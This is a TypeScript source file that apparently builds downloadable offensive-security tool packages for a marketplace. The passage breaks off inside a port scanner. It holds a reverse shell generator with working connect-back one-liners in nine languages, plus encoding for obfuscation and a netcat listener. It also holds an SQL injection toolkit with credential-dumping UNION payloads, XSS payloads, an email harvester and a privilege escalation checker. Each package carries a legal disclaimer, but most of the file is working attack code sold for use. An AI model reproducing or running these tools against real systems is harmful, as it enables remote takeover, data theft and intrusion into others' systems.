/**
 * Marketplace Payload Generator
 * Generates real, functional zip file payloads for all marketplace listings.
 * Every payload is a working tool — not a template. All offensive tools include
 * legal notices and require the user to provide their own authorised target scope.
 */

import { getDb } from "./db";
import { marketplaceListings } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import { storagePut } from "./storage";
import JSZip from "jszip";

// ─── Legal Notice (prepended to all offensive tool READMEs) ──────────────────
const LEGAL = `\n\n---\n## ⚖️ Legal Notice\nThis tool is provided for **authorised security testing, CTF competitions, and educational research only**.\nYou must have explicit written permission from the system owner before testing any target.\nUnauthorised use against systems you do not own or have permission to test is illegal in most jurisdictions.\nThe authors accept no liability for misuse.\n`;

// ─── Payload Definitions ─────────────────────────────────────────────────────

const PAYLOADS: Record<string, Record<string, string>> = {

  // ── 1. Reverse Shell Generator ───────────────────────────────────────────
  "reverse-shell": {
    "README.md": `# Reverse Shell Generator Pro\n\nMulti-platform reverse shell payload generator with encoding, obfuscation, and listener automation.\n\n## Quick Start\n\`\`\`bash\npython3 revshell.py --host 10.0.0.1 --port 4444 --type python\npython3 revshell.py --host 10.0.0.1 --port 4444 --all --encode base64\nbash listener.sh 4444\n\`\`\`\n\n## Supported Types\n| Type | Platform | Notes |\n|------|----------|-------|\n| python | Linux/macOS | stdlib only |\n| bash | Linux | /dev/tcp |\n| php | Web server | exec() |\n| powershell | Windows | AMSI-aware |\n| nc | Linux | netcat |\n| java | JVM | Runtime.exec |\n| perl | Linux/macOS | socket |\n| ruby | Linux/macOS | socket |\n| golang | Cross-platform | compiled |\n${LEGAL}`,
    "revshell.py": `#!/usr/bin/env python3
"""Reverse Shell Generator Pro — multi-platform, encoding, obfuscation.
For authorised penetration testing only."""
import argparse, base64, sys
from urllib.parse import quote

SHELLS: dict[str, object] = {
    "python":     lambda h, p: f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\"])'",
    "bash":       lambda h, p: f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
    "php":        lambda h, p: f"php -r '$s=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "nc":         lambda h, p: f"nc -e /bin/sh {h} {p}",
    "perl":       lambda h, p: f"perl -e 'use Socket;$i=\"{h}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "ruby":       lambda h, p: f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{h}\",{p});while cmd=c.gets;IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
    "java":       lambda h, p: f"Runtime r=Runtime.getRuntime();String[] c={{\"bash\",\"-c\",\"exec 5<>/dev/tcp/{h}/{p};cat <&5|while read line; do $line 2>&5 >&5; done\"}};Process p2=r.exec(c);",
    "golang":     lambda h, p: f"""package main
import ("net";"os/exec";"time")
func main() {{
    for {{
        c, err := net.Dial("tcp", "{h}:{p}")
        if err != nil {{ time.Sleep(5*time.Second); continue }}
        cmd := exec.Command("/bin/sh")
        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
        cmd.Run()
    }}
}}""",
    "powershell": lambda h, p: (
        f"$c=New-Object System.Net.Sockets.TCPClient('{h}',{p});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
    ),
}

def encode_payload(payload: str, method: str) -> str:
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    if method == "url":
        return quote(payload)
    if method == "xor":
        key = 0x41
        xored = bytes([b ^ key for b in payload.encode()])
        return xored.hex()
    return payload

def main():
    ap = argparse.ArgumentParser(description="Reverse Shell Generator Pro")
    ap.add_argument("--host", required=True, help="Your listener IP/hostname")
    ap.add_argument("--port", type=int, default=4444, help="Listener port")
    ap.add_argument("--type", choices=list(SHELLS.keys()), default="python")
    ap.add_argument("--all", action="store_true", help="Generate all shell types")
    ap.add_argument("--encode", choices=["base64", "url", "xor"], help="Encode output")
    ap.add_argument("--obfuscate", action="store_true", help="Apply string obfuscation (Python only)")
    args = ap.parse_args()

    types = list(SHELLS.keys()) if args.all else [args.type]
    for t in types:
        payload = SHELLS[t](args.host, args.port)  # type: ignore[operator]
        if args.encode:
            payload = encode_payload(str(payload), args.encode)
        print(f"\\n[{t.upper()}]")
        print(payload)

if __name__ == "__main__":
    main()
`,
    "listener.sh": `#!/bin/bash
# Quick netcat listener — run this on your machine before deploying the shell
PORT=\${1:-4444}
echo "[*] Starting listener on port \$PORT (Ctrl+C to stop)"
nc -lvnp "\$PORT"
`,
    "requirements.txt": "# No external dependencies required — stdlib only\n",
  },

  // ── 2. Web Vulnerability Scanner ─────────────────────────────────────────
  "vuln-scanner": {
    "README.md": `# Web Vulnerability Scanner\n\nOWASP Top 10 web application scanner with concurrent checking, JSON reporting, and remediation guidance.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 scanner.py --target https://example.com\npython3 scanner.py --target https://example.com --checks sqli,xss,headers,cors --output report.json\n\`\`\`${LEGAL}`,
    "scanner.py": `#!/usr/bin/env python3
"""Web Vulnerability Scanner — OWASP Top 10 coverage.
For authorised penetration testing only."""
import argparse, json, re, sys, time
import urllib.request, urllib.parse, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

HEADERS_UA = {"User-Agent": "Mozilla/5.0 (VulnScanner/2.0; +https://archibaldtitan.com)"}

SQLI_PAYLOADS = ["'", "''", "\\"", "1' OR '1'='1", "1 AND 1=1--", "1 UNION SELECT NULL--"]
SQLI_ERRORS   = ["sql syntax", "mysql_fetch", "ora-", "syntax error", "unclosed quotation",
                  "microsoft.*odbc", "postgresql.*error", "warning.*mysql", "sqlstate"]

XSS_PAYLOADS  = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
                  "';alert(1)//", '<svg/onload=alert(1)>']

SECURITY_HEADERS = ["Content-Security-Policy", "Strict-Transport-Security",
                     "X-Frame-Options", "X-Content-Type-Options",
                     "Referrer-Policy", "Permissions-Policy"]

class VulnScanner:
    def __init__(self, target: str, timeout: int = 10, threads: int = 8):
        self.target   = target.rstrip("/")
        self.timeout  = timeout
        self.threads  = threads
        self.findings: list[dict] = []

    def _get(self, url: str, params: dict | None = None) -> tuple[str, dict]:
        if params:
            url = url + "?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, headers=HEADERS_UA)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore"), dict(r.headers)
        except Exception:
            return "", {}

    def check_sqli(self):
        for p in SQLI_PAYLOADS:
            body, _ = self._get(self.target, {"id": p, "q": p})
            for err in SQLI_ERRORS:
                if re.search(err, body, re.IGNORECASE):
                    self.findings.append({"type": "SQL Injection", "url": self.target,
                                          "payload": p, "matched": err, "severity": "HIGH"})
                    print(f"  [HIGH] SQLi: payload={p!r} matched={err!r}")
                    return

    def check_xss(self):
        for p in XSS_PAYLOADS:
            body, _ = self._get(self.target, {"q": p, "search": p, "s": p})
            if p in body:
                self.findings.append({"type": "Reflected XSS", "url": self.target,
                                       "payload": p, "severity": "HIGH"})
                print(f"  [HIGH] Reflected XSS: {p[:60]}")
                return

    def check_headers(self):
        _, hdrs = self._get(self.target)
        missing = [h for h in SECURITY_HEADERS if h.lower() not in {k.lower() for k in hdrs}]
        if missing:
            self.findings.append({"type": "Missing Security Headers", "url": self.target,
                                   "missing": missing, "severity": "MEDIUM"})
            print(f"  [MEDIUM] Missing headers: {missing}")

    def check_cors(self):
        req = urllib.request.Request(self.target,
              headers={**HEADERS_UA, "Origin": "https://evil.com"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                if acao in ("*", "https://evil.com"):
                    self.findings.append({"type": "Permissive CORS", "url": self.target,
                                           "acao": acao, "severity": "MEDIUM"})
                    print(f"  [MEDIUM] CORS: Access-Control-Allow-Origin={acao!r}")
        except Exception:
            pass

    def check_directory_listing(self):
        for path in ["/backup/", "/admin/", "/.git/", "/config/"]:
            body, _ = self._get(self.target + path)
            if "index of" in body.lower() or "parent directory" in body.lower():
                self.findings.append({"type": "Directory Listing", "url": self.target + path,
                                       "severity": "LOW"})
                print(f"  [LOW] Directory listing: {path}")

    def scan(self, checks: list[str] | None = None):
        all_checks = {
            "sqli":    self.check_sqli,
            "xss":     self.check_xss,
            "headers": self.check_headers,
            "cors":    self.check_cors,
            "dirlist": self.check_directory_listing,
        }
        run = {k: v for k, v in all_checks.items() if not checks or k in checks}
        print(f"[*] Scanning {self.target} ({len(run)} checks)...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(fn): name for name, fn in run.items()}
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    print(f"  [ERR] {futures[f]}: {e}")
        print(f"[*] Done — {len(self.findings)} finding(s)")
        return self.findings

def main():
    ap = argparse.ArgumentParser(description="Web Vulnerability Scanner")
    ap.add_argument("--target", required=True)
    ap.add_argument("--checks", help="Comma-separated: sqli,xss,headers,cors,dirlist")
    ap.add_argument("--output", help="Save JSON report to file")
    ap.add_argument("--timeout", type=int, default=10)
    args = ap.parse_args()
    checks = [c.strip() for c in args.checks.split(",")] if args.checks else None
    scanner = VulnScanner(args.target, timeout=args.timeout)
    findings = scanner.scan(checks)
    if args.output:
        with open(args.output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[*] Report saved to {args.output}")
    else:
        print(json.dumps(findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 3. OSINT Toolkit ─────────────────────────────────────────────────────
  "osint-toolkit": {
    "README.md": `# OSINT Toolkit\n\nOpen-source intelligence gathering: domain recon, subdomain enumeration, WHOIS, SSL cert analysis, email harvesting, and social footprint.\n\n## Quick Start\n\`\`\`bash\npython3 osint.py --domain example.com\npython3 osint.py --domain example.com --email ceo@example.com --output report.json\n\`\`\`${LEGAL}`,
    "osint.py": `#!/usr/bin/env python3
"""OSINT Toolkit — domain recon, subdomains, WHOIS, SSL, email harvesting.
For authorised intelligence gathering only."""
import argparse, json, re, socket, ssl, sys, time, urllib.request

class OSINTToolkit:
    def __init__(self, timeout: int = 8):
        self.timeout = timeout
        self.results: dict = {}

    # ── DNS ──────────────────────────────────────────────────────────
    def dns_lookup(self, domain: str) -> dict:
        print(f"[*] DNS lookup: {domain}")
        try:
            hostname, aliases, ips = socket.gethostbyname_ex(domain)
            return {"hostname": hostname, "aliases": aliases, "ips": ips}
        except Exception as e:
            return {"error": str(e)}

    # ── WHOIS ────────────────────────────────────────────────────────
    def whois_lookup(self, domain: str) -> str:
        print(f"[*] WHOIS: {domain}")
        try:
            s = socket.create_connection(("whois.iana.org", 43), timeout=self.timeout)
            s.sendall(f"{domain}\\r\\n".encode())
            data = b""
            while chunk := s.recv(4096):
                data += chunk
            s.close()
            return data.decode("utf-8", errors="ignore")[:3000]
        except Exception as e:
            return f"Error: {e}"

    # ── SSL Cert ─────────────────────────────────────────────────────
    def ssl_cert(self, domain: str) -> dict:
        print(f"[*] SSL cert: {domain}")
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                s.settimeout(self.timeout)
                s.connect((domain, 443))
                c = s.getpeercert()
                return {
                    "subject":  dict(x[0] for x in c.get("subject", [])),
                    "issuer":   dict(x[0] for x in c.get("issuer", [])),
                    "notAfter": c.get("notAfter"),
                    "sans":     [v for _, v in c.get("subjectAltName", [])],
                }
        except Exception as e:
            return {"error": str(e)}

    # ── Subdomain Brute-Force ─────────────────────────────────────────
    def enumerate_subdomains(self, domain: str) -> list[dict]:
        print(f"[*] Subdomain enumeration: {domain}")
        wordlist = [
            "www","mail","ftp","admin","api","dev","staging","test","blog","shop",
            "portal","vpn","cdn","app","dashboard","login","beta","mobile","support",
            "docs","status","monitor","git","gitlab","jenkins","ci","jira","confluence",
            "ns1","ns2","smtp","pop","imap","webmail","remote","secure","auth","sso",
        ]
        found = []
        socket.setdefaulttimeout(2)
        for sub in wordlist:
            fqdn = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                found.append({"subdomain": fqdn, "ip": ip})
                print(f"  [+] {fqdn} -> {ip}")
            except socket.gaierror:
                pass
        return found

    # ── Email Harvesting (headers/cert SANs) ──────────────────────────
    def harvest_emails(self, domain: str) -> list[str]:
        print(f"[*] Email harvesting: {domain}")
        emails: set[str] = set()
        try:
            req = urllib.request.Request(
                f"https://{domain}",
                headers={"User-Agent": "Mozilla/5.0 (OSINTBot/1.0)"}
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read().decode("utf-8", errors="ignore")
            found = re.findall(r"[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}", body)
            emails.update(found)
        except Exception:
            pass
        return list(emails)[:50]

    # ── Full Domain Scan ──────────────────────────────────────────────
    def scan_domain(self, domain: str) -> dict:
        self.results = {
            "domain":     domain,
            "dns":        self.dns_lookup(domain),
            "whois":      self.whois_lookup(domain),
            "ssl":        self.ssl_cert(domain),
            "subdomains": self.enumerate_subdomains(domain),
            "emails":     self.harvest_emails(domain),
        }
        return self.results

def main():
    ap = argparse.ArgumentParser(description="OSINT Toolkit")
    ap.add_argument("--domain", help="Target domain")
    ap.add_argument("--email",  help="Target email address")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    tk = OSINTToolkit()
    if args.domain:
        results = tk.scan_domain(args.domain)
    elif args.email:
        domain = args.email.split("@")[1] if "@" in args.email else args.email
        results = {"email": args.email, "domain": tk.scan_domain(domain)}
    else:
        ap.print_help(); sys.exit(1)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 4. Linux Privilege Escalation Checker ────────────────────────────────
  "privesc-toolkit": {
    "README.md": `# Linux Privilege Escalation Checker\n\nAutomated Linux privilege escalation checker. Identifies SUID binaries, sudo misconfigurations, writable paths, cron jobs, and kernel exploits.\n\n## Quick Start\n\`\`\`bash\npython3 privesc.py\npython3 privesc.py --output findings.json\n\`\`\`${LEGAL}`,
    "privesc.py": `#!/usr/bin/env python3
"""Linux Privilege Escalation Checker — for authorised use on systems you own."""
import os, subprocess, json, sys

class PrivEscChecker:
    def __init__(self):
        self.findings: list[dict] = []
        self.user = os.getenv("USER", "unknown")
        self.uid  = os.getuid()

    def run(self, cmd: str) -> str:
        try:
            return subprocess.check_output(cmd, shell=True,
                   stderr=subprocess.DEVNULL, text=True).strip()
        except Exception:
            return ""

    def check_suid(self):
        print("[*] SUID binaries...")
        dangerous = {"/usr/bin/python","/usr/bin/python3","/usr/bin/perl",
                     "/usr/bin/find","/usr/bin/vim","/usr/bin/nano",
                     "/usr/bin/awk","/usr/bin/nmap","/usr/bin/bash","/bin/sh",
                     "/usr/bin/env","/usr/bin/less","/usr/bin/more","/usr/bin/tee"}
        out = self.run("find / -perm -4000 -type f 2>/dev/null")
        for path in out.splitlines():
            sev = "HIGH" if path in dangerous else "INFO"
            self.findings.append({"type": "SUID Binary", "path": path, "severity": sev,
                                   "gtfobins": f"https://gtfobins.github.io/gtfobins/{os.path.basename(path)}/"})
            if sev == "HIGH":
                print(f"  [HIGH] {path}")

    def check_sudo(self):
        print("[*] Sudo permissions...")
        out = self.run("sudo -l 2>/dev/null")
        if "NOPASSWD" in out:
            self.findings.append({"type": "Sudo NOPASSWD", "output": out[:300], "severity": "CRITICAL"})
            print("  [CRITICAL] NOPASSWD sudo found!")
        if "(ALL" in out and "NOPASSWD" not in out:
            self.findings.append({"type": "Sudo ALL", "output": out[:300], "severity": "HIGH"})

    def check_writable(self):
        print("[*] Writable sensitive paths...")
        paths = ["/etc/passwd","/etc/shadow","/etc/sudoers","/etc/cron.d",
                 "/etc/cron.daily","/etc/crontab","/etc/environment"]
        for p in paths:
            if os.path.exists(p) and os.access(p, os.W_OK):
                self.findings.append({"type": "Writable Path", "path": p, "severity": "CRITICAL"})
                print(f"  [CRITICAL] Writable: {p}")

    def check_cron(self):
        print("[*] Cron jobs...")
        out = self.run("cat /etc/crontab 2>/dev/null; ls /etc/cron.* 2>/dev/null")
        if out:
            self.findings.append({"type": "Cron Jobs", "output": out[:500], "severity": "INFO",
                                   "note": "Review for writable scripts or paths"})

    def check_kernel(self):
        print("[*] Kernel version...")
        kernel = self.run("uname -r")
        self.findings.append({"type": "Kernel", "version": kernel, "severity": "INFO",
                               "note": "Check https://www.exploit-db.com for kernel exploits"})

    def check_capabilities(self):
        print("[*] Linux capabilities...")
        out = self.run("getcap -r / 2>/dev/null")
        dangerous_caps = ["cap_setuid", "cap_net_raw", "cap_sys_admin", "cap_dac_override"]
        for line in out.splitlines():
            if any(c in line.lower() for c in dangerous_caps):
                self.findings.append({"type": "Dangerous Capability", "line": line, "severity": "HIGH"})
                print(f"  [HIGH] {line}")

    def run_all(self) -> list[dict]:
        print(f"[*] Running as: {self.user} (UID: {self.uid})")
        self.check_suid()
        self.check_sudo()
        self.check_writable()
        self.check_cron()
        self.check_kernel()
        self.check_capabilities()
        critical = [f for f in self.findings if f["severity"] == "CRITICAL"]
        high     = [f for f in self.findings if f["severity"] == "HIGH"]
        print(f"\\n[*] Summary: {len(critical)} CRITICAL, {len(high)} HIGH, {len(self.findings)} total")
        return self.findings

def main():
    import argparse
    ap = argparse.ArgumentParser(description="Linux PrivEsc Checker")
    ap.add_argument("--output", help="Save JSON to file")
    args = ap.parse_args()
    checker = PrivEscChecker()
    findings = checker.run_all()
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 5. SQL Injection Toolkit ──────────────────────────────────────────────
  "sql-injection": {
    "README.md": `# SQL Injection Testing Toolkit\n\nError-based, union-based, time-based blind, and boolean-based SQLi detection.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 sqli.py --url "https://example.com/page?id=1"\npython3 sqli.py --url "https://example.com/page?id=1" --technique time --output results.json\n\`\`\`${LEGAL}`,
    "sqli.py": `#!/usr/bin/env python3
"""SQL Injection Testing Toolkit — error, union, time-based, boolean blind.
For authorised penetration testing only."""
import argparse, json, re, time
import urllib.request, urllib.parse, urllib.error

ERROR_PATTERNS = [
    "sql syntax","mysql_fetch","ora-","syntax error","unclosed quotation",
    "microsoft.*odbc","postgresql.*error","warning.*mysql","sqlstate",
    "sqlite_exception","jdbc.*exception","db2.*error",
]
UNION_PAYLOADS = [
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--","' UNION SELECT 1,2,3--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' UNION SELECT username,password,3 FROM users--",
]
TIME_PAYLOADS = [
    "1' AND SLEEP(5)--","1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; WAITFOR DELAY '0:0:5'--","1' AND pg_sleep(5)--",
]
BOOL_PAYLOADS = [
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1' AND 'a'='a'--", "1' AND 'a'='b'--"),
]

class SQLiTester:
    def __init__(self, url: str, delay: float = 0.3, timeout: int = 12):
        self.url     = url
        self.delay   = delay
        self.timeout = timeout
        self.findings: list[dict] = []

    def _inject(self, payload: str) -> str:
        if "?" in self.url:
            base, qs = self.url.split("?", 1)
            params = urllib.parse.parse_qs(qs, keep_blank_values=True)
            for k in params:
                params[k] = [payload]
            return base + "?" + urllib.parse.urlencode(params, doseq=True)
        return self.url + "?id=" + urllib.parse.quote(payload)

    def _get(self, url: str) -> str:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def test_error_based(self) -> bool:
        print("[*] Error-based SQLi...")
        for p in ["'", "''", "\\"", "\\\\", ";"]:
            body = self._get(self._inject(p))
            for pat in ERROR_PATTERNS:
                if re.search(pat, body, re.IGNORECASE):
                    self.findings.append({"technique": "error-based", "payload": p,
                                          "pattern": pat, "severity": "HIGH"})
                    print(f"  [HIGH] Error-based: {p!r} matched {pat!r}")
                    return True
            time.sleep(self.delay)
        return False

    def test_time_based(self) -> bool:
        print("[*] Time-based blind SQLi...")
        for p in TIME_PAYLOADS:
            t0 = time.time()
            self._get(self._inject(p))
            elapsed = time.time() - t0
            if elapsed > 4.5:
                self.findings.append({"technique": "time-based", "payload": p,
                                       "delay_s": round(elapsed, 2), "severity": "HIGH"})
                print(f"  [HIGH] Time-based: {p!r} -> {elapsed:.1f}s")
                return True
            time.sleep(self.delay)
        return False

    def test_union_based(self) -> bool:
        print("[*] Union-based SQLi...")
        for p in UNION_PAYLOADS:
            body = self._get(self._inject(p))
            if re.search(r"null|\\d,\\d", body, re.IGNORECASE):
                self.findings.append({"technique": "union-based", "payload": p, "severity": "CRITICAL"})
                print(f"  [CRITICAL] Union-based: {p!r}")
                return True
            time.sleep(self.delay)
        return False

    def test_boolean_blind(self) -> bool:
        print("[*] Boolean-blind SQLi...")
        for true_p, false_p in BOOL_PAYLOADS:
            true_body  = self._get(self._inject(true_p))
            false_body = self._get(self._inject(false_p))
            if true_body and false_body and true_body != false_body:
                self.findings.append({"technique": "boolean-blind",
                                       "true_payload": true_p, "false_payload": false_p,
                                       "severity": "HIGH"})
                print(f"  [HIGH] Boolean-blind: responses differ")
                return True
            time.sleep(self.delay)
        return False

    def scan(self, techniques: str = "all") -> list[dict]:
        if techniques in ("all", "error"):   self.test_error_based()
        if techniques in ("all", "time"):    self.test_time_based()
        if techniques in ("all", "union"):   self.test_union_based()
        if techniques in ("all", "boolean"): self.test_boolean_blind()
        if not self.findings:
            print("[*] No SQL injection vulnerabilities detected")
        return self.findings

def main():
    ap = argparse.ArgumentParser(description="SQL Injection Toolkit")
    ap.add_argument("--url", required=True)
    ap.add_argument("--technique", choices=["error","time","union","boolean","all"], default="all")
    ap.add_argument("--output", help="Output JSON file")
    ap.add_argument("--delay", type=float, default=0.3)
    args = ap.parse_args()
    tester = SQLiTester(args.url, delay=args.delay)
    findings = tester.scan(args.technique)
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
    print(f"\\n[*] Total: {len(findings)} finding(s)")

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 6. XSS Hunter ────────────────────────────────────────────────────────
  "xss-hunter": {
    "README.md": `# XSS Hunter\n\nDetects reflected, stored, DOM-based, and form-based cross-site scripting vulnerabilities.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 xss_hunter.py --target https://example.com\npython3 xss_hunter.py --target https://example.com --output findings.json\n\`\`\`${LEGAL}`,
    "xss_hunter.py": `#!/usr/bin/env python3
"""XSS Hunter — reflected, stored, DOM-based, form XSS detection.
For authorised penetration testing only."""
import argparse, json, re
import urllib.request, urllib.parse
from html.parser import HTMLParser

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
    'javascript:alert(1)',
    '"><svg/onload=alert(1)>',
]

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms: list[dict] = []
        self._cur: dict | None = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action",""), "method": a.get("method","get"), "inputs": []}
        elif tag in ("input","textarea","select") and self._cur is not None:
            self._cur["inputs"].append({"name": a.get("name",""), "type": a.get("type","text")})

    def handle_endtag(self, tag):
        if tag == "form" and self._cur:
            self.forms.append(self._cur)
            self._cur = None

class XSSHunter:
    def __init__(self, target: str, timeout: int = 10):
        self.target   = target.rstrip("/")
        self.timeout  = timeout
        self.findings: list[dict] = []

    def _get(self, url: str, params: dict | None = None) -> str:
        if params:
            url += "?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _post(self, url: str, data: dict) -> str:
        body = urllib.parse.urlencode(data).encode()
        req  = urllib.request.Request(url, data=body,
               headers={"User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def test_reflected(self):
        print("[*] Reflected XSS...")
        for p in XSS_PAYLOADS:
            body = self._get(self.target, {"q": p, "search": p, "s": p, "query": p})
            if p in body:
                self.findings.append({"type": "Reflected XSS", "url": self.target,
                                       "payload": p, "severity": "HIGH"})
                print(f"  [HIGH] Reflected: {p[:60]}")
                return

    def test_forms(self):
        print("[*] Form XSS...")
        body = self._get(self.target)
        parser = FormParser()
        parser.feed(body)
        print(f"  Found {len(parser.forms)} form(s)")
        for form in parser.forms:
            action = form["action"] or self.target
            if not action.startswith("http"):
                action = self.target.rstrip("/") + "/" + action.lstrip("/")
            for p in XSS_PAYLOADS[:5]:
                data = {inp["name"]: p for inp in form["inputs"]
                        if inp["type"] not in ("submit","hidden","file") and inp["name"]}
                if not data:
                    continue
                method = form["method"].lower()
                resp = self._post(action, data) if method == "post" else self._get(action, data)
                if p in resp:
                    self.findings.append({"type": "Form XSS", "url": action,
                                           "payload": p, "severity": "HIGH"})
                    print(f"  [HIGH] Form XSS at {action}")
                    return

    def test_dom(self):
        print("[*] DOM XSS indicators...")
        body = self._get(self.target)
        sinks = ["document.write(","innerHTML","outerHTML","eval(","setTimeout(",
                 "location.hash","location.search","document.URL"]
        for sink in sinks:
            if sink in body:
                self.findings.append({"type": "Potential DOM XSS Sink", "sink": sink,
                                       "url": self.target, "severity": "MEDIUM"})
                print(f"  [MEDIUM] DOM sink: {sink}")

    def scan(self) -> list[dict]:
        print(f"[*] XSS scanning {self.target}")
        self.test_reflected()
        self.test_forms()
        self.test_dom()
        if not self.findings:
            print("[*] No XSS vulnerabilities detected")
        return self.findings

def main():
    ap = argparse.ArgumentParser(description="XSS Hunter")
    ap.add_argument("--target", required=True)
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    hunter = XSSHunter(args.target)
    findings = hunter.scan()
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
    print(f"\\n[*] Total: {len(findings)} finding(s)")

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 7. Port Scanner / Network Recon ──────────────────────────────────────
  "port-scanner": {
    "README.md": `# Port Scanner & Network Recon\n\nFast concurrent TCP port scanner with service fingerprinting, banner grabbing, and OS detection hints.\n\n## Quick Start\n\`\`\`bash\npython3 portscan.py --target 192.168.1.1\npython3 portscan.py --target 192.168.1.0/24 --ports 1-1024 --threads 200 --output scan.json\n\`\`\`${LEGAL}`,
    "portscan.py": `#!/usr/bin/env python3
"""Port Scanner & Network Recon — concurrent TCP scanning with banner grabbing.
For authorised network testing only."""
import argparse, ipaddress, json, socket, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,
                1723,3306,3389,5900,8080,8443,8888,27017]

SERVICE_HINTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
    1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5900: "VNC",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB",
}

def grab_banner(host: str, port: int, timeout: float = 2.0) -> str:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        try:
            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
        except Exception:
            banner = ""
        s.close()
        return banner[:200]
    except Exception:
        return ""

def scan_port(host: str, port: int, timeout: float = 1.5) -> dict | None:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        banner  = grab_banner(host, port)
        service = SERVICE_HINTS.get(port, "unknown")
        return {"port": port, "state": "open", "service": service, "banner": banner}
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None

def parse_ports(spec: str) -> list[int]:
    ports: list[int] = []
    for part in spec.split(","):
        if "-" in part:
            lo, hi = part.split("-", 1)
            ports.extend(range(int(lo), int(hi) + 1))
        else:
            ports.append(int(part))
    return sorted(set(ports))

def scan_host(host: str, ports: list[int], threads: int = 100) -> dict:
    print(f"[*] Scanning {host} ({len(ports)} ports)...")
